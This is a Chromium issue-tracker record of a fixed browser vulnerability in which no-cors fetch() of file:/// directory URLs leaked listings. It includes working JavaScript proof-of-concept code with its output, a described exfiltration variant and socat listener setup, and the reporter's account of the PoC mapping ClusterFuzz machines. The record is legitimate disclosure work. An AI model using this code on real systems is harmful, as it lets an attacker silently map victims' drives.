# Security: Directory listing no-cors issue

| Field | Value |
|-------|-------|
| **Issue ID** | [41492103](https://issues.chromium.org/issues/41492103) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>SecurityFeature>CORS |
| **Platforms** | Linux, Mac, Windows |
| **Reporter** | ma...@shell.fishing |
| **Assignee** | es...@chromium.org |
| **Created** | 2024-01-17 |
| **Bounty** | $5,000.00 |

## Description

**VULNERABILITY DETAILS**  

Chrome (and other Chromium-based browsers) on Windows are vulnerable to an information disclosure vulnerability by way of a limited SOP bypass on no-cors fetch() requests for local directory listings which can be triggered from local html files. These local html trigger files can be delivered (prompted to download/open) directly to a victim from a site or an email client and do not present warning messages as html files are not present on most file extension blocklists. The vulnerability appears to only be present on Chrome and other Chromium-based browsers running on Windows; I did not exhaustively test other OS other than Linux. The latest version of Edge was also confirmed vulnerable using the exact same exploit.

Chrome treats each 'file:///' page as its own origin and isolated tab, and so attempts to retrieve the contents of other local files or directory listings returns an error indicating that SOP/CORS restrictions have prevented the request. Here is an example of proper enforcement:

```
t=await fetch('file://C:/users');  
dirbleed.html:1 Access to fetch at 'file:///C:/users' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: http, data, isolated-app, chrome-extension, chrome, https, chrome-untrusted.  
t=await fetch('file://C:/users/', {mode: 'no-cors'});  
Response {type: 'opaque', url: '', redirected: false, status: 0, ok: false, …}  

```

From my research, I have discovered it is possible to bypass this protection by using a 'no-cors' fetch() call on a file:/// directory URL and omitting the trailing slash for the directory path for the URL. This results in a redirect to the file:/// URL containing the proper trailing forward slash, but in doing so the response type turns from 'opaque' to 'basic'. For example:

```
t=await fetch('file://C:/users/', {mode: 'no-cors'});  
Response {type: 'opaque', url: '', redirected: false, status: 0, ok: false, …}  
t=await fetch('file://C:/users', {mode: 'no-cors'});  
Response {type: 'basic', url: 'file:///C:/users/', redirected: true, status: 0, ok: false, …}  

```

Given the new response object type is 'basic', it can now be read from to retrieve the directory listing of any arbitrary directory path. From what I can tell, this is completely against the spec for 'no-cors' fetch() - all response objects should be 'opaque'. Each file entry in the directory listing contains the entry's name, timestamp, size, and whether or not the entry is a directory. Below is a minimized test case, demonstrating exploitation of the vulnerability from a `file:///` context:

```
t=await fetch('file://C:/users', {mode: 'no-cors'});  
  
Response {type: 'basic', url: 'file:///C:/users/', redirected: true, status: 0, ok: false, …}body: ReadableStreamlocked: false[[Prototype]]: ReadableStreamcancel: ƒ cancel()getReader: ƒ getReader()locked: falsepipeThrough: ƒ pipeThrough()pipeTo: ƒ pipeTo()tee: ƒ tee()constructor: ƒ ReadableStream()Symbol(Symbol.toStringTag): "ReadableStream"get locked: ƒ locked()[[Prototype]]: ObjectbodyUsed: falseheaders: Headers {}ok: falseredirected: truestatus: 0statusText: ""type: "basic"url: "file:///C:/users/"[[Prototype]]: Response  
  
let result = '';  
const reader = t.body.getReader();  
while (true) {  
    const { done, value } = await reader.read();  
    if (done) {  
      break;  
    }  
    result += new TextDecoder("utf-8").decode(value);  
  }  
const lines = result.split('\n');  
console.log(lines.filter(line => line.includes('addRow')))  
VM5484:1 (7) ['function addRow(name, url, isdir,', '\x3Cscript>addRow("All Users","All%20Users",1,0,"0 B",1575711039,"12/7/19, 1:30:39 AM");\x3C/script>', '\x3Cscript>addRow("Default","Default",1,0,"0 B",1701939525,"12/7/23, 12:58:45 AM");\x3C/script>', '\x3Cscript>addRow("Default User","Default%20User",1,0,"0 B",1575711039,"12/7/19, 1:30:39 AM");\x3C/script>', '\x3Cscript>addRow("Public","Public",1,0,"0 B",1701929253,"12/6/23, 10:07:33 PM");\x3C/script>', '\x3Cscript>addRow("user","user",1,0,"0 B",1702055666,"12/8/23, 9:14:26 AM");\x3C/script>', '\x3Cscript>addRow("desktop.ini","desktop.ini",0,174,"174 B",1575709962,"12/7/19, 1:12:42 AM");\x3C/script>']  

```

The impact of this vulnerability is that an attacker can effectively map a victim's hard drive, checking for the contents of directories which may reveal sensitive pieces of information. Examples include: 3rd party software installed, file versions based off timestamp and file size, windows update timestamps, list of drivers, browser extensions, paths randomized for security reasons such as temporary or appdata files, credential file locations, list of recent files, and other potentially sensitive filenames. For example, an attacker may crawl source code or document folders to obtain paths and metadata. This can also be used to perform directory listings against UNC paths, including enumerating currently mounted drives (E$-Z$) and their directory contents. The partially weaponized exploit performs the enumerations listed above, as well as parsing entries to perform crawling for directories one level deep, it then POSTs it back to a webserver server over HTTPS.

**REPRODUCTION CASE**  

I have provided a video of exploitation from my site as well as the html trigger file containing the exploit used.

1. modify the html to point to your own HTTPS\* listener (postURL variable)
2. setup a simple nginx+socat listener to handle the HTTPS request:
   - location /dirbleed/push { proxy\_pass <http://127.0.0.1:8888>; } in your nginx config
   - socat to catch the JSON formatted directory listing on the webserver: socat -T5 TCP4-LISTEN:8888,fork,reuseaddr STDOUT
3. open the html file on a Windows host and observe the socat window scrolling for a little while (exploit not optimized for speed)

**VERSION**  

Chrome 120.0.6099.225 (Official build) (64-bit) On Windows 10 22H2 - vulnerable  

Chrome 106.0.5249.119 (Official build) (64-bit) On Windows 10 22H2 - vulnerable  

Chrome 88.0.4324.146 (Official build) (64-bit) On Windows 10 22H2 - NOT vulnerable  

Edge 120.0.2210.133 (Official build) (64-bit) On Windows 10 22H2 - vulnerable

**CREDIT INFORMATION**  

Matt Howard

## Attachments

- [poc_demo.mkv](attachments/poc_demo.mkv) (application/octet-stream, 7.7 MB)
- [dirbleed.html](attachments/dirbleed.html) (text/plain, 6.8 KB)
- [cluster_fuzz_other_bugreports_scopeddirs.out](attachments/cluster_fuzz_other_bugreports_scopeddirs.out) (application/octet-stream, 9.6 KB)
- [clusterfuzz_heads_up.txt](attachments/clusterfuzz_heads_up.txt) (text/plain, 6.9 KB)
- [heads_up.png](attachments/heads_up.png) (image/png, 336.3 KB)
- [list_of_uniq_scoped_dirs](attachments/list_of_uniq_scoped_dirs) (text/plain, 80.5 KB)
- [dirbleed_noexfil.html](attachments/dirbleed_noexfil.html) (text/plain, 6.4 KB)
- [noexfil.png](attachments/noexfil.png) (image/png, 327.1 KB)
- [all_chromium.png](attachments/all_chromium.png) (image/png, 322.3 KB)

## Timeline

### [Deleted User] (2024-01-17)

[Empty comment from Monorail migration]

### cl...@chromium.org (2024-01-18)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4740634386038784.

### ma...@shell.fishing (2024-01-18)

Heads up! The 'dirbleed.html' PoC attached is still set to send the exfil to my listener! O_O

I didn't want to change the provided PoC in the off chance that it affected your analysis reproducing the issue. I saw requests coming in shortly after the clusterfuzz email arrived.

It is actively mapping the inside of clusterfuzz instances right now. Please do not run this on any VMs that may contain anything you do not want coming back to the domain. Or just modify the domain as suggested in the 'reproduction case' section. I apologize for this.


I did notice something interesting though as it was coming in...

C:\Program Files\ contains 'scoped_dirs' with what looks like ID numbers

```
{
        "filename": "scoped_dir1012_1036847886",
        "is_dir": "1",
        "f_size_h": "0 B",
        "ts_s": "1/5/24, 1:53:37 PM"
      },
      {
        "filename": "scoped_dir1012_1389716701",
        "is_dir": "1",
        "f_size_h": "0 B",
        "ts_s": "1/5/24, 1:45:39 PM"
      },
      {
        "filename": "scoped_dir1012_1508704743",
        "is_dir": "1",
        "f_size_h": "0 B",
        "ts_s": "1/12/24, 7:39:09 AM"
      },
```

I didnt see anything suggesting it might be other bug report runs or internal sandbox runs from other Googlers but is it possible these sandboxes are persistent? If so, if a vulnerability were exploited to provide arbitrary read or system access from a clusterfuzz run - would it impact any other sensitive data? I could be completely wrong, but it might be worth looking into.

Anyhow, Ive attached the screenshots/output so they may be deleted if necessary.

### ma...@shell.fishing (2024-01-18)

Looking at the run now in clusterfuzz UI as my user, I can see it was ran with the `--allow-file-access-from-files` command line option.

I cannot test from my account, only a Googler or someone with ClusterFuzz job creation/re-upload access could, but if you modified my payload to check those "scoped dirs" and (ab)used the fact clusterfuzz runs these samples as local html with the `--allow-file-access-from-files` option set... could you crawl through and find sensitive data then effectively *read* it to exfil back given the options set?

```
[Command line] c:\clusterfuzz\bot\builds\chromium-browser-asan_win32-release_x64_e8abf88e7a5ec8bcd0cd391cfae402f143e8ddb2\revisions\chrome.exe --user-data-dir=c:\tmp\user_profile_0 --enable-logging=stderr --v=1 --allow-file-access-from-files --disable-gesture-requirement-for-media-playback --disable-click-to-play --disable-hang-monitor --disable-default-apps --disable-component-update --safebrowsing-disable-auto-update --metrics-recording-only --disable-gpu-watchdog --disable-metrics --disable-popup-blocking --disable-prompt-on-repost --enable-experimental-extension-apis --enable-nacl --js-flags="--expose-gc" --new-window --no-default-browser-check --no-first-run --no-process-singleton-dialog --use-fake-device-for-media-stream --use-fake-ui-for-media-stream --disable-features=RendererCodeIntegrity c:\clusterfuzz\bot\inputs\fuzzer-testcases\dirbleed.html
```

Really interesting.

### ma...@shell.fishing (2024-01-18)

Got curious, cant stop looking further..

I suspect it is the case these VMs are being re-used in-between runs... 'scoped_dir' is the prefixed used for crashpad, etc as defined in 'base/files/scoped_temp_dir.cc' for the ScopedTempDir.

They should be deleted after use if the docs and comments are to be believed, but in this case there may be something preventing the deletion such as the folder permissions on C:\Program Files in the VM. The path prefix for scoped temp dirs is in the registry, I cannot really glean too much more information about your setup from this vantage point.

For my run alone, I observed some 3245 different scoped_data dirs across the CF runs!

constexpr FilePath::CharType kScopedDirPrefix[] =
    FILE_PATH_LITERAL("scoped_dir");

Whether or not these directories actually contain sensitive information (such as metadata/cache from other bug reports) is only one facet here. Even if they were all empty, does this prove the clusterfuzz VM is re-used for 2+ weeks (based off earliest timestamp observed)? If they are, can a clusterfuzz be run with a full chain exploit persist on said VM and slurp subsequent runs?

I reserve the right to be completely incorrect about all of this. I just think it's interesting. I've attached the scoped_dirs observed if it helps it down further. 

### za...@google.com (2024-01-19)

[Empty comment from Monorail migration]

### am...@chromium.org (2024-01-19)

[Empty comment from Monorail migration]

### ma...@shell.fishing (2024-01-22)

... Was anyone able to confirm these findings, other than what CF brought back?

### za...@google.com (2024-01-22)

Hi clamy@ can you please help take a look at this bug? Thank you.

### am...@chromium.org (2024-01-22)

I cc'ed myself on  this issue due to the the testcase being uploaded to clusterfuzz and working with the appropriate team to clear it out from the CF bots 
AFAICT this hasn't been locally reproduced, but I think that is because the original security shepherd was remiss in reaching out to you here to request a new test case that doesn't exfil to your LP. Can you please provide a new testcase that doesn't perform the callout? 
While this is a user information disclosure, this isn't Critical severity based on the information provided. Tentatively reducing to high severity, though this may end up being medium severity. Having a safer test case that doesn't beacon out the directory data will help us assess that. Thanks. 
Adding needs-feedback in the interim. 

zackhan@ since you were original shepherd on this, would you mind performing the repro once the new testcase has been provided? This will ensure that the web platform team has more actionable information to investigate. Thanks! 

[Monorail components: Blink>SecurityFeature>CORS]

### ma...@shell.fishing (2024-01-23)

Certainly, thank you for following up. I agree this issue is not critical.

In addition to sending to the LP, the original test case was also sending the data to console.log(). My apologies for not minimizing the test case, I was mistaken in thinking the end-to-end PoC would be useful.

I have attached the new test case which will append the contents to the document body instead of POST'ing back. Should your team have any other questions, I am more or less an open book - please feel free to ask here or OOB.


Should I open a separate ticket for the potential CF VM persistence/'--allow-file-access-from-file' issue or is this considered an accepted risk?

### za...@google.com (2024-01-23)

[Comment Deleted]

### ad...@google.com (2024-01-23)

(I am a bot: this is an auto-cc on a security bug)

### za...@google.com (2024-01-24)

Hi clamy@chromium.org, could you please help review this bug? I've found that it surfaced in M99 (99.0.4836.0 (Developer Build) (64-bit) ) for Windows. It does not occur in M98, but it does in M99. Additionally, I was not able to reproduce the bug on Linux, it is not reproducible on Linux. 

### [Deleted User] (2024-01-24)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-24)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-25)

[Empty comment from Monorail migration]

### ma...@shell.fishing (2024-01-29)

Should I report this up to MSRC for Edge or hold off? 

### za...@google.com (2024-01-29)

cc'd lyf@ for visibility. Can your team take a look at this bug when you get a chance? Thank you! 

### [Deleted User] (2024-01-31)

clamy: Uh oh! This issue still open and hasn't been updated in the last 14 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### is...@google.com (2024-01-31)

This issue was migrated from crbug.com/chromium/1519122?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-02-15)

clamy: Uh oh! This issue still open and hasn't been updated in the last 28 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add Disable-Nags (case sensitive) to the Chromium Labels custom field.

### pe...@google.com (2024-02-15)

Thank you for providing more feedback. Adding the requester to the CC list.

### ma...@shell.fishing (2024-02-20)

Howdy, checking in again. Is there a procedure for reporting to the other Chromium-based browsers (should I?) or will Google handle that independently to the other vendors for this case? VRPs are.. new to me.

Screenshot attached confirms exploitation on latest Chrome, Edge, Brave, Opera, and Vivaldi.

Cheers,
Matt

### ma...@shell.fishing (2024-04-09)

It has now been 83 days since this vulnerability was first reported, stuck as a "P1"/medium severity. 
Given the lack of response (1/23 last human response), I am to assume this is a WONTFIX issue?
Anyhow, please set the visibility to 'public' next week.

Thanks and have a nice day~

### am...@chromium.org (2024-05-03)

Hi Matt, thanks for raising this through alternate channels. Sincere apologies that things went a bit dormant here. We swarmed over the clusterfuzz issue once your testcase got uploaded, but we failed on following up to ensure someone from the team saw this. The current owner is away / out of office at present. I'm pinging some of the team to see who is a better / best owner for this in the meantime.

### es...@chromium.org (2024-05-03)

I'm taking a look at this. I was able to reproduce on Mac and Linux, so not just a Windows thing.

### es...@chromium.org (2024-05-03)

Update: Bisected to https://chromium.googlesource.com/chromium/src/+log/b140844026d947076b86ae25cc1371b5f33b4661..268e65004215716c3957b229794357da23acaf2d on Mac. Sort of; it's not that the bug seems to have been introduced, but rather than fetch() didn't support `file` URLs before that point ("Fetch API cannot load file:///.... URL scheme "file" is not supported.").

I'm guessing this is related to https://chromium-review.googlesource.com/c/chromium/src/+/3179883, and wondering if fetch() is supposed to even work for file URLs, since that change seems to have intended to be for extensions.

### es...@chromium.org (2024-05-03)

Ok there are a lot of problems going on here!

1. https://chromium-review.googlesource.com/c/chromium/src/+/3179883/66/extensions/renderer/dispatcher.cc#300 added file: to the list of supported fetch() URL schemes, possibly inadvertently for the open web. We could try to disable fetch() of file: URLs for web content, allowing it only for extensions -- but I'm a little nervous to just go and do that because it might break something that has come to rely on it.

2. There seems to be some confusion in the code about what "SupportingFetchAPI" means. file: is registered in the above line as RegisterURLSchemeAsSupportingFetchAPI, following other schemes like extension:, but FetchManager sends those schemes into PerformHTTPFetch, which seems wrong [1]. It seems like these schemes should have their own fetch implementations, per [2]. I'm not sure if there are any consequences of this, offhand -- it just seems weird.

3. The spec is comically unhelpful. [3]

4. After all that, the fix is 1 line: we need to set redirect_data_->response_type when synthesizing a redirect to a directory listing [4]. I've verified this fixes the problem locally, but need to follow up with a CL that adds a test (and verify that it hopefully doesn't break anything else).

[1] https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/fetch/fetch_manager.cc;l=899;drc=8b35c4f4d196c367754b2fedd213b662c98f34fd;bpv=0;bpt=1
[2] https://source.chromium.org/chromium/chromium/src/+/main:third_party/blink/renderer/core/fetch/fetch_manager.cc;l=907;drc=8b35c4f4d196c367754b2fedd213b662c98f34fd;bpv=0;bpt=1
[3] https://fetch.spec.whatwg.org/#fetch-method:~:text=a%20body.-,%22file%22,When%20in%20doubt%2C%20return%20a%20network%20error.,-HTTP(S)%20scheme
[4] https://source.chromium.org/chromium/chromium/src/+/main:content/browser/loader/file_url_loader_factory.cc;l=508;drc=8b35c4f4d196c367754b2fedd213b662c98f34fd;bpv=0;bpt=1

### es...@chromium.org (2024-05-03)

(Removing OS=Android somewhat speculatively; based on (1) from my previous comment, I believe the problem was never introduced on OSes where there is no extension support, but I haven't actually tested Android.)

### es...@chromium.org (2024-05-04)

CL at https://chromium-review.googlesource.com/c/chromium/src/+/5516030

### ap...@google.com (2024-05-07)

Project: chromium/src
Branch: main

commit 886229a0ca577b2ce1a491c5628235c0e4508338
Author: Emily Stark <estark@google.com>
Date:   Tue May 07 05:46:23 2024

    Preserve response type when synthesizing redirects to directory listings
    
    When handling a path that is a directory but doesn't end in a trailing
    separator, FileURLLoaderFactory synthesizes a redirect to a directory
    listing. However, in doing so, it was failing to copy over the
    response type, leading to (e.g.) opaque responses getting converted to
    basic ones. This CL fixes that by copying over the response type in
    the redirect data.
    
    While writing a unit test, I also encountered a separate problem with
    FileURLDirectoryLoader, which is that it doesn't report a
    |decoded_body_length| in the URLCompletionStatus to its
    URLLoaderClient. This is an API contract violation that was causing
    SimpleURLLoader to return ERR_UNEXPECTED in the unit test [1]. I
    therefore modified FileURLDirectoryLoader to keep track of and report
    bytes written, similarly to how FileURLLoader does in the
    |total_bytes_written_| field.
    
    [1] https://source.chromium.org/chromium/chromium/src/+/main:services/network/public/cpp/simple_url_loader.cc;l=1975;drc=0586a538d8b452fe3da212737140878ed16eed49;bpv=0;bpt=1
    
    Bug: 41492103
    Change-Id: Id642aed39b7faf6cb20e2c80f81927fa1c89cfcd
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/5516030
    Reviewed-by: Adam Rice <ricea@chromium.org>
    Commit-Queue: Emily Stark <estark@chromium.org>
    Cr-Commit-Position: refs/heads/main@{#1297291}

M       content/browser/loader/file_url_loader_factory.cc
M       content/browser/loader/file_url_loader_factory_unittest.cc

https://chromium-review.googlesource.com/5516030


### ma...@shell.fishing (2024-05-08)

You are correct, it wasn't just a Windows thing.
Not sure why my first attempts on Linux didn't reproduce the issue, perhaps I had forgotten to change the original path at the time back in January...(>_<). My focus was on Windows for a related tangent which may turn into another ticket later if this patch didn't squish it already. 

I confirmed this morning it works on Mac/Linux.

Thanks for following up with the issue.

### sp...@google.com (2024-05-15)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $5000.00 for this report.

Rationale for this decision:
$5,000 for this high-quality report of an exploit mitigation bypass with functional exploit -- great work! 

Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. Two other things we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.
* If you are already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have already registered, there is no need to repeat the process and you’ll automatically be paid soon. If you have any payment related questions or issues, please reach out to p2p-vrp@google.com.

### pe...@google.com (2024-08-14)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### ma...@shell.fishing (2025-04-17)

Please donate my reward to the ACLU.

I implore fellow human beings in our community who can afford to do so to do the same.

Thank you

### am...@chromium.org (2025-08-15)

As requested, your reward has been doubled -- as is standard for donated rewards, and, $10,000 has been donated to the ACLU.

## Bounty Award

> $5,000 for this high-quality report of an exploit mitigation bypass with functional exploit -- great work! 
> 
> Thank you for your efforts and helping us make Chrome more secure for all users!
> 
> Cheers,
> Chrome VRP Panel Bot
> 
> 
> P.S. Two other things we'd like to mention:
> 
> * Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library tha

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/41492103)*
